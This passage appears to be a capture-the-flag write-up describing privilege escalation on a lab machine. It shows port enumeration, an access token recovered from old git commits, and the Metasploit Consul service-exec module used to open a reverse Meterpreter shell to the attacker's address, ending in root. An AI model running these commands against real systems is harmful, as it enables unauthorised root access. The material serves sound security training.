Enumerating network connections to the box as well as looking in ```/opt``` will show that that Hashicorps Consul API is running. 
```bash
$ netstat -anlp | grep -i listen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -  
[TRUNCATED]

$ curl localhost:8500
Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.
```
After doing a bit of research, I found there is a CVE that gives command execution, but I need permission to call the API first....
Checking out ```/opt``` shows a directory (```/opt/my-app```) that contains a .git file -> maybe there's something interesting in the past commits? 
Use a desktop app (I used GitHub Desktop) to view past commits in this repository:
![[Pasted image 20221025202844.png]]
Excellent! It contains an access token for calling the API
Now, I can use meterpreter to get a root shell
*Note I don't normally like using meterpreter but I didn't have any luck finding a PoC for this CVE online :(*
```bash
msf6 exploit(multi/misc/consul_service_exec) > set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
# Since this API is only exposed internally, I used an SSH tunnel with ports 8500
msf6 exploit(multi/misc/consul_service_exec) > set RHOSTS localhost
msf6 exploit(multi/misc/consul_service_exec) > set LHOST 10.10.14.12
msf6 exploit(multi/misc/consul_service_exec) > exploit
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Creating service 'yxgZXgpB'
[-] Exploit aborted due to failure: unexpected-reply: An error occured when contacting the Consul API.
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Creating service 'tREBZ'
[*] Service 'tREBZ' successfully created.
[*] Waiting for service 'tREBZ' script to trigger
[*] Sending stage (989032 bytes) to 10.10.11.183
[*] Meterpreter session 2 opened (10.10.14.12:4444 -> 10.10.11.183:38732) at 2022-10-25 20:31:46 -0500
[*] Removing service 'tREBZ'
[*] Command Stager progress - 100.00% done (763/763 bytes)
[*] Session 2 created in the background.
# Not sure why msf backgrounds these by default but whatever
msf6 exploit(multi/misc/consul_service_exec) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 5209 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
```
